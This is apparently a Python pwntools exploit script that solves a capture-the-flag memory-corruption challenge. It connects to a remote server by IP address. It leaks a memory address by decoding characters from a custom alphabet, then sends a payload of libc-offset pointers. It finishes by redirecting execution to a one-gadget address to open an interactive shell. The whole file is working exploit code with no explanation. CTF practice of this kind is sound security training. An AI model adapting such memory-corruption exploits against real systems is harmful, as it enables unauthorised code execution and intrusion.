#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe
a = "MmApIsSafeDoNtYOuThink"
#r = gdb.debug("./chall_patched")
#r = process("./chall_patched")
r = remote("34.143.130.87", 4096)
#r = remote("localhost",2005)
def add(idx,size,content):
    r.sendlineafter("choice : ", b'1')
    r.sendlineafter("Index: ",str(idx).encode())
    r.sendlineafter("Size: ",str(size).encode())
    r.sendlineafter("note: ",content)


add(0,0x2000,b'a')
add(0,0x2000,b'a')
add(0,0x2000,b'a')


r.recvuntil("name: ")
leak = 0

for i in range(12):
    c = r.recv(1).decode('ascii')
    cnt = 0
    for j in range(len(a)):
        if c == a[j]:
            cnt = j
    c = cnt << 4*i    
    leak += c

log.info("LEAK: " + hex(leak))




#0x1770
r.sendlineafter("choice : ", b'1')
r.sendlineafter("Index: ", b'0')
r.sendlineafter("Size: ",str(0x6000).encode())
context.log_level = 1
r.sendlineafter("choice : ", b'2')
r.sendlineafter("Index: ", b'0')

p = b'\0'*0x2000 + b'\0'*0x6b0 + p64(leak + 0x221580 - 0x2000) + p64(leak + 0x229340 - 0x2000) + p64(0) + p64(leak + 0x1c54c0 - 0x2000) + p64(leak + 0x1c5ac0 - 0x2000) + p64(0)*13 + p64(leak + 0x4740 - 0x2000) + p64(leak + 0x5160 - 0x2000) + p64(leak + 0x4740 - 0x2000) + p64(0)*3  
#p = b'\x41'*0x26b0

r.sendlineafter("note: ", p) 

base = leak + 0x5000
context.log_level = 1
payload = b'\0'*0x28 + p64(base + 0x50a37)
r.sendline(payload)
r.interactive()